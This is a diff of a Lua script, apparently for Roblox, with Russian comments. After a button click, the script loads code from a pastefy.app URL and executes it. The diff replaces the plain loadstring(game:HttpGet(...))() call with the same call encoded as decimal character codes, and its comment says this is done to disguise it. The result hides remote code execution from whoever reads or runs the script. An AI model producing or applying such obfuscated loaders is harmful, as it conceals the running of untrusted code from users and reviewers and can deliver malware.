@@ -145,13 +145,20 @@ button.MouseButton1Click:Connect(function()
                 conn:Disconnect()  
                 gui:Destroy()  
 
-                -- Загружаем и выполняем скрипт  
-                local success, err = pcall(function()  
-                    loadstring(game:HttpGet("https://pastefy.app/mTbfVy0H/raw", true))()  
-                end)  
-                if not success then  
-                    warn("Ошибка при выполнении скрипта: "..tostring(err))  
-                end  
+                -- Загружаем и выполняем скрипт (замаскировано под цифры)
+                local encoded = {
+                    108,111,97,100,115,116,114,105,110,103,40,
+                    103,97,109,101,58,72,116,116,112,71,101,116,40,
+                    34,104,116,116,112,115,58,47,47,112,97,115,116,101,102,121,46,97,112,112,
+                    47,109,84,98,102,86,121,48,72,47,114,97,119,34,44,32,116,114,117,101,41,
+                    41,40,41
+                }
+                local scriptStr = ""
+                for _,v in ipairs(encoded) do
+                    scriptStr = scriptStr .. string.char(v)
+                end
+                local fn,err = loadstring(scriptStr)
+                if fn then fn() else warn("Ошибка при декодировании: "..tostring(err)) end
             end  
         end)  
     else  
